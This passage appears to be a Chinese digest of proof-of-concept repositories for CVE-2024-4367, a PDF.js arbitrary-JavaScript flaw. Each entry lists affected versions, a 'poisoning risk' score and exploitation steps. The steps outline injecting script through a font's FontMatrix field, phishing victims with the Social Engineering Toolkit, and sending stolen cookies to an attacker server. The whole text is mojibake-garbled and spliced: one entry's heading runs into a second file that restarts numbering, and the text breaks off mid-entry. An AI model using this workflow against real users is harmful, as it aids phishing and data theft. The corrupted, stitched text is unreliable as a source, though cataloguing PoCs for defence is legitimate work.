è™½ç„¶README.mdæ–‡ä»¶æœ¬èº«çœ‹èµ·æ¥åƒä¸€ä¸ªåˆæ³•çš„æ¼æ´åˆ©ç”¨æŒ‡å—ï¼Œä½†ä»”ç»†åˆ†æè„šæœ¬æè¿°å’Œæ“ä½œæ­¥éª¤ï¼Œå‘ç°å…¶ä¾èµ–äºSocial Engineering Toolkit (SET)æ¥å‘èµ·é’“é±¼æ”»å‡»ï¼Œå¹¶ä¸”åŒ…å«æ‰§è¡Œä»»æ„jsçš„payload, å­˜åœ¨ä¸€å®šçš„**æŠ•æ¯’é£é™©**ã€‚Payloadå¯èƒ½è¢«ä¿®æ”¹ä¸ºæ‰§è¡Œæ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·å‡­æ®æˆ–æ‰§è¡Œä»»æ„ä»£ç ã€‚è¯¥POCä»£ç ä¸­ï¼Œé£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **ä¾èµ–å¤–éƒ¨å·¥å…·ï¼š** è„šæœ¬ä¾èµ–äºSETï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåˆ©ç”¨SETçš„é…ç½®è¿‡ç¨‹è¿›è¡Œæ¶æ„é…ç½®ï¼Œè¯±å¯¼ç”¨æˆ·æ‰§è¡Œæœ‰å®³æ“ä½œã€‚
2.  **Payloadå¯å®šåˆ¶ï¼š** è„šæœ¬å…è®¸ç”¨æˆ·è‡ªå®šä¹‰JavaScript payloadï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥æ³¨å…¥ä»»æ„æ¶æ„ä»£ç ã€‚
3.  **ç¤¾ä¼šå·¥ç¨‹ï¼š** è„šæœ¬ä½¿ç”¨ç¤¾ä¼šå·¥ç¨‹æ‰‹æ®µä¼ æ’­æ¶æ„PDFï¼Œè¿™å¢åŠ äº†æ”»å‡»æˆåŠŸçš„å¯èƒ½æ€§ã€‚
4.  **æ•°æ®å¤–æ³„ï¼š** Payloadå¯ä»¥çªƒå–æ•°æ®ï¼ˆå¦‚cookieï¼‰ï¼Œå¹¶å°†å…¶å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚

å› æ­¤ï¼Œæˆ‘ä¼°è®¡æ­¤ä»“åº“å­˜åœ¨**10%**çš„æŠ•æ¯’é£é™©ï¼Œä¸»è¦é›†ä¸­åœ¨payloadçš„æ½œåœ¨æ¶æ„æ€§å’Œåˆ©ç”¨ç¤¾å·¥æ‰‹æ®µä¼ æ’­ä¸Šã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ­¤å¤„è®¨è®ºçš„â€œæŠ•æ¯’â€å¹¶éæŒ‡ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„ä¾›åº”é“¾æŠ•æ¯’ï¼Œè€Œæ˜¯æŒ‡åˆ©ç”¨è¯¥POCè¿›è¡Œæ”»å‡»æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥åµŒå…¥æ¶æ„ä»£ç æˆ–è¿›è¡Œæ¬ºéª—ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **å‡†å¤‡ç¯å¢ƒï¼š** å®‰è£…Python 3.x, SETï¼Œä»¥åŠPyPDF2ç­‰ä¾èµ–ã€‚
2.  **åˆ›å»ºæ¶æ„PDFï¼š** ä½¿ç”¨æä¾›çš„è„šæœ¬ï¼Œé€šè¿‡ä¿®æ”¹`template.pdf`çš„`/FontMatrix`å­—æ®µï¼Œæ³¨å…¥JavaScript payloadï¼Œç”Ÿæˆ`malicious.pdf`ã€‚
3.  **ç¤¾å·¥æ”»å‡»ï¼š** ä½¿ç”¨SETæˆ–å…¶ä»–å·¥å…·ï¼Œé€šè¿‡ç”µå­é‚®ä»¶æˆ–å…¶ä»–æ–¹å¼ï¼Œå°†`malicious.pdf`å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚
4.  **æœåŠ¡å™¨ç›‘å¬ï¼š** è¿è¡Œä¸€ä¸ªHTTPæœåŠ¡å™¨ï¼Œç”¨äºæ‰˜ç®¡`malicious.pdf`ï¼Œå¹¶æ”¶é›†payloadçªƒå–çš„æ•°æ®ã€‚
5.  **å—å®³è€…äº¤äº’ï¼š** å—å®³è€…æ‰“å¼€`malicious.pdf`åï¼Œpayloadæ‰§è¡Œï¼Œçªƒå–æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [exfil0/WEAPONIZING-CVE-2024-4367](https://github.com/exfil0/WEAPONIZING-CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #17

**æ¥æº**: [CVE-2024-4367-inpentest_CVE-2024-4367-PoC.md](../2024/CVE-2024-4367-inpentest_CVE-2024-4367-PoC.md)

## CVE-2024-4367-PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€ä¼šè¯åŠ«æŒç­‰

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ¼æ´å­˜åœ¨äº PDF.js ä¸­ï¼Œç”±äºç¼ºå°‘å¯¹å­—ä½“å¤„ç†çš„ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼ŒåµŒå…¥æ¶æ„JavaScriptä»£ç ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„ JavaScript ä»£ç å°†åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„PoCä»£ç æ˜¯ä¸€ä¸ªPDFæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„JavaScriptä»£ç ã€‚PDFæ–‡ä»¶åˆ©ç”¨äº†å­—ä½“å¤„ç†æ¼æ´ï¼Œå½“PDF.jsè§£æå­—ä½“æ—¶ï¼Œä¼šæ‰§è¡ŒåµŒå…¥çš„JavaScriptã€‚

**æŠ•æ¯’é£é™©ï¼š**
è¯¥ä»“åº“åŒ…å«ä¸€ä¸ª PDF PoC,ä¸€ä¸ª LICENSE æ–‡ä»¶ï¼Œå’Œä¸€ä¸ª READMEã€‚LICENSE æ–‡ä»¶å’Œ README æ–‡ä»¶æœ¬èº«æ²¡æœ‰é£é™©ã€‚è™½ç„¶PoCä»£ç èƒ½ç›´æ¥åˆ©ç”¨æ¼æ´ï¼Œä½†ä½œè€… Ahmad Kabiri çš„èº«ä»½æœªçŸ¥ï¼Œä¸”PoCçš„ç›®çš„æ˜¯å±•ç¤ºæ”»å‡»ï¼Œå› æ­¤å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåœ¨å®é™…åˆ©ç”¨æ—¶ä¿®æ”¹æˆ–å¢åŠ payload, ä½†è¯¥ PoC æ–‡ä»¶æœ¬èº«ç›®çš„æ˜ç¡®ï¼Œç»“æ„ç®€å•ï¼Œéšè—æ¶æ„åé—¨ä»£ç å¯èƒ½æ€§è¾ƒä½ã€‚è€ƒè™‘åˆ°MITåè®®çš„å¼€æ”¾æ€§ä»¥åŠä½œè€…å·²çŸ¥çš„æ¼æ´ç ”ç©¶èƒŒæ™¯ï¼ŒæŠ•æ¯’çš„å¯èƒ½æ€§è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…æ„é€ åŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…è¯±éª—ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ (ä¾‹å¦‚, é€šè¿‡é’“é±¼é‚®ä»¶, æŒ‚é©¬ç½‘ç«™)ã€‚
3.  å¦‚æœç”¨æˆ·ä½¿ç”¨çš„æµè§ˆå™¨æˆ–é‚®ä»¶å®¢æˆ·ç«¯ï¼ˆä¾‹å¦‚ Firefox, Firefox ESR, Thunderbirdï¼‰çš„ PDF.js ç‰ˆæœ¬å­˜åœ¨æ¼æ´ï¼Œåˆ™æ¶æ„JavaScriptä»£ç å°†è¢«æ‰§è¡Œã€‚
4.  æ¶æ„JavaScriptä»£ç å¯ä»¥åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–cookieã€localStorageæ•°æ®ã€sessionStorageæ•°æ®ï¼Œç”šè‡³è¿›è¡Œä¼šè¯åŠ«æŒç­‰ã€‚PoCä»£ç æ˜¾ç¤ºä¼šå¼¹å‡ºå¤šä¸ªalertæ¡†æ¥å±•ç¤ºè·å–åˆ°çš„ä¿¡æ¯.

**é¡¹ç›®åœ°å€:** [inpentest/CVE-2024-4367-PoC](https://github.com/inpentest/CVE-2024-4367-PoC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #18

**æ¥æº**: [CVE-2024-4367-m0d0ri205_PDFJS.md](../2024/CVE-2024-4367-m0d0ri205_PDFJS.md)

## CVE-2024-4367-Firefox-PDF.js-Arbitrary-JavaScript-Execution

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡» (XSS) å’Œæ•æ„Ÿä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº Mozilla Firefox, Firefox ESR å’Œ Thunderbird ä¸­çš„é«˜å±æ¼æ´ã€‚è¯¥æ¼æ´æºäº PDF.js åœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„æµè§ˆå™¨ç‰ˆæœ¬æ‰“å¼€åŒ…å«æ¶æ„ JavaScript çš„ PDF æ–‡ä»¶æ—¶ï¼Œè¿™æ®µ JavaScript ä»£ç å°†è¢«æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡» (XSS), è·å–æ•æ„Ÿä¿¡æ¯ç­‰é£é™©ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ¼æ´åˆ©ç”¨ä»£ç çš„ç›®çš„æ˜¯æ­å»ºä¸€ä¸ªæ˜“å—æ”»å‡»çš„ç¯å¢ƒæ¥æµ‹è¯• CVE-2024-4367 ã€‚ docker-compose.yml å’Œ Dockerfile ç”¨äºæ„å»ºä¸€ä¸ªåŒ…å« expressï¼Œmulter å’Œ pdfjs-dist çš„ node åº”ç”¨ã€‚ app.js æ¥æ”¶ä¸Šä¼ çš„ PDF æ–‡ä»¶ï¼Œå¹¶é€šè¿‡ pdfjs-dist åœ¨æµè§ˆå™¨ä¸­æ¸²æŸ“ã€‚å¦‚æœ PDF æ–‡ä»¶åŒ…å«æ¶æ„çš„ JavaScript ä»£ç ï¼Œé‚£ä¹ˆå®ƒå°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚å› æ­¤ï¼ŒPOC ä»£ç æœ¬èº«ä¸æ˜¯æ¼æ´åˆ©ç”¨ï¼Œè€Œæ˜¯æ­å»ºæ˜“å—æ”»å‡»ç¯å¢ƒï¼Œç„¶åéœ€è¦æ”»å‡»è€…æ„é€ ç‰¹æ®Šçš„PDFæ–‡ä»¶åˆ©ç”¨æ­¤æ¼æ´ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

åˆ†æäº†æä¾›çš„POCä»£ç ï¼Œå‘ç°å…¶ä¸­ `/deploy/app.js` ä¸­å­˜åœ¨è·å– `/flag` æ¥å£çš„é€»è¾‘ï¼Œä½†åªæœ‰å½“è¯·æ±‚æ¥è‡ª `127.0.0.1` æ—¶æ‰ä¼šè¿”å› `SF{FAKE_FLAG}`ã€‚è€Œ `/deploy/flag.txt` æ–‡ä»¶ä¸­åŒ…å«çœŸæ­£çš„ flag `flag{pdf_js_pdf}`ï¼Œè¿™ä¸ªflagå¯èƒ½æ„å‘³ç€çœŸå®çš„åˆ©ç”¨ã€‚å¦‚æœä½œè€…çš„æœ¬æ„æ˜¯è¿·æƒ‘ä½¿ç”¨è€…ä½¿ç”¨å‡çš„flagï¼Œä¸”ä½¿ç”¨è€…ä¸ä»”ç»†åˆ†æä»£ç ï¼Œå¯èƒ½ä¼šè¢«è¯¯å¯¼ã€‚ä»£ç ä¸­å­˜åœ¨ä¸€å®šçš„è¿·æƒ‘æ€§ï¼Œä½†ä¸»è¦ç›®çš„æ˜¯æµ‹è¯•ï¼ŒæŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**

1.  æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªæ¶æ„çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨ PDF.js åœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥çš„æ¼æ´ï¼ŒåµŒå…¥æ¶æ„çš„ JavaScript ä»£ç ã€‚
2.  æ”»å‡»è€…å°†æ­¤æ¶æ„ PDF æ–‡ä»¶å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚
3.  ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefox, Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡ä»¶ã€‚
4.  ç”±äºæ¼æ´çš„å­˜åœ¨ï¼Œæ¶æ„ JavaScript ä»£ç å°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚è¿™ä¸ª JavaScript ä»£ç å¯ä»¥æ‰§è¡Œå„ç§æ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå– Cookieã€é‡å®šå‘ç”¨æˆ·åˆ°æ¶æ„ç½‘ç«™ã€ç”šè‡³æ‰§è¡Œå…¶ä»–æ”»å‡»ã€‚

åˆ©ç”¨è¯¥æ¼æ´çš„å…³é”®åœ¨äºæ„é€ ä¸€ä¸ªèƒ½å¤Ÿç»•è¿‡ PDF.js ç±»å‹æ£€æŸ¥çš„æ¶æ„ PDF æ–‡ä»¶ï¼Œå¹¶åµŒå…¥èƒ½å¤Ÿæ‰§è¡Œæ”»å‡»è€…æ‰€éœ€æ“ä½œçš„ JavaScript ä»£ç ã€‚


**é¡¹ç›®åœ°å€:** [m0d0ri205/PDFJS](https://github.com/m0d0ri205/PDFJS)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #19

**æ¥æº**: [CVE-2024-4367-pS3ud0RAnD0m_CVE-2024-4367-POC.md](../2024/CVE-2024-4367-pS3ud0RAnD0m_CVE-2024-4367-POC.md)

# CVE-2024-4367

> ğŸ“¦ è¯¥CVEæœ‰ **23** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2024-4367-0xr2r_CVE-2024-4367.md](../2024/CVE-2024-4367-0xr2r_CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶åï¼Œæ”»å‡»è€…çš„JavaScriptä»£ç å°†åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)ã€ä¿¡æ¯çªƒå–æˆ–å…¶ä»–æ¶æ„è¡Œä¸ºã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œæä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº†PDF.jså­—ä½“å¤„ç†ä¸­ç¼ºå°‘ç±»å‹æ£€æŸ¥çš„æ¼æ´ï¼Œå°†JavaScriptä»£ç æ³¨å…¥åˆ°PDFæ–‡ä»¶ä¸­ï¼Œå¹¶åœ¨æ‰“å¼€è¯¥æ–‡ä»¶æ—¶æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©ï¼š**
è™½ç„¶POCä»£ç æœ¬èº«æ˜¯ä¸ºäº†éªŒè¯æ¼æ´çš„å­˜åœ¨ï¼Œä½†ä»“åº“ä¸­å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚POCä»£ç çš„åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„JavaScriptçš„PDFæ–‡ä»¶ï¼Œå…¶ç›®çš„æ˜¯è§¦å‘æ¼æ´ã€‚ä½†mali.pdfå¯èƒ½å­˜åœ¨éé¢„æœŸä»£ç çš„é£é™©ã€‚å› æ­¤ï¼Œé£é™©è¯„ä¼°ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…å°†æ¶æ„PDFæ–‡ä»¶å‘é€ç»™å—å®³è€…ï¼Œæˆ–è€…å°†å…¶æ‰˜ç®¡åœ¨ç½‘ç«™ä¸Šè¯±å¯¼å—å®³è€…ä¸‹è½½ã€‚
3.  å—å®³è€…ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶ã€‚
4.  PDF.jsè§£æPDFæ–‡ä»¶æ—¶ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„JavaScriptä»£ç è¢«æ‰§è¡Œã€‚
5.  æ¶æ„JavaScriptä»£ç åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€ä¿¡æ¯çªƒå–æˆ–å…¶ä»–æ¶æ„è¡Œä¸ºã€‚

**é¡¹ç›®åœ°å€:** [0xr2r/CVE-2024-4367](https://github.com/0xr2r/CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #2

**æ¥æº**: [CVE-2024-4367-1337rokudenashi_Odoo_PDFjs_CVE-2024-4367.pdf.md](../2024/CVE-2024-4367-1337rokudenashi_Odoo_PDFjs_CVE-2024-4367.pdf.md)

## CVE-2024-4367-Firefox-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox/Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰å’Œä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla PDF.js ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚\n\n**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**\næä¾›çš„ POC ä»£ç æ˜¯ä¸€ä¸ª PDF æ–‡ä»¶ï¼Œå®ƒé€šè¿‡æ„é€ æ¶æ„çš„ Type1 å­—ä½“ï¼Œåœ¨ `FontMatrix` å­—æ®µä¸­æ³¨å…¥ JavaScript ä»£ç  `prompt("1337rokudenashi");`ã€‚å½“ PDF.js è§£æè¯¥ PDF æ–‡ä»¶å¹¶å¤„ç†è¯¥å­—ä½“æ—¶ï¼Œè¿™æ®µ JavaScript ä»£ç ä¼šè¢«æ‰§è¡Œã€‚ æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥ POC ä»£ç åº”è¯¥æœ‰æ•ˆï¼Œå¯ä»¥è§¦å‘æ¼æ´ã€‚\n\n**æŠ•æ¯’é£é™©åˆ†æï¼š**\næŸ¥çœ‹æä¾›çš„ POC ä»£ç ï¼Œå…¶ä¸­ `prompt("1337rokudenashi");` è¿™æ®µä»£ç çš„åŠŸèƒ½æ˜¯å¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œå¯ä»¥ç¡®è®¤POCæœ‰æ•ˆï¼Œä½†æœ¬èº«å¹¶æ²¡æœ‰æ¶æ„è¡Œä¸ºï¼Œä¸å±äºåé—¨ä»£ç ã€‚å…¶ä½™çš„PDFç»“æ„ä»£ç æ˜¯æ¼æ´åˆ©ç”¨çš„å¿…è¦ç»„æˆéƒ¨åˆ†ï¼Œä¹Ÿæ²¡æœ‰å‘ç°éšè—çš„æ¶æ„ä»£ç æˆ–åé—¨ã€‚ å› æ­¤ï¼Œå¯ä»¥è®¤ä¸ºè¯¥ POC ä»£ç ä¸å­˜åœ¨æŠ•æ¯’é£é™©ã€‚\n\n**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**\n1.  **æ„é€ æ¶æ„ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ Type 1 å­—ä½“çš„ PDF æ–‡ä»¶ã€‚å…³é”®åœ¨äº `FontMatrix` å­—æ®µï¼Œæ”»å‡»è€…åœ¨è¯¥å­—æ®µä¸­æ’å…¥ JavaScript ä»£ç ã€‚\n2.  **è¯±å¯¼ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦è¯±ä½¿ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚\n3.  **æ‰§è¡Œ JavaScript ä»£ç ï¼š** å½“ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šè§£æè¯¥æ–‡ä»¶ã€‚åœ¨å¤„ç†åˆ°æ¶æ„ Type 1 å­—ä½“æ—¶ï¼Œ`FontMatrix` å­—æ®µä¸­çš„ JavaScript ä»£ç ä¼šè¢«æ‰§è¡Œã€‚\n4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´åï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨æˆ–é‚®ä»¶å®¢æˆ·ç«¯ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼Œä¾‹å¦‚çªƒå– Cookieã€è·å–æ•æ„Ÿä¿¡æ¯ï¼Œç”šè‡³æ‰§è¡Œè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€‚

**é¡¹ç›®åœ°å€:** [1337rokudenashi/Odoo_PDFjs_CVE-2024-4367.pdf](https://github.com/1337rokudenashi/Odoo_PDFjs_CVE-2024-4367.pdf)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #3

**æ¥æº**: [CVE-2024-4367-BektiHandoyo_cve-pdf-host.md](../2024/CVE-2024-4367-BektiHandoyo_cve-pdf-host.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€XSSæ”»å‡»å’Œè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­ï¼‰

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„æ„é€ çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

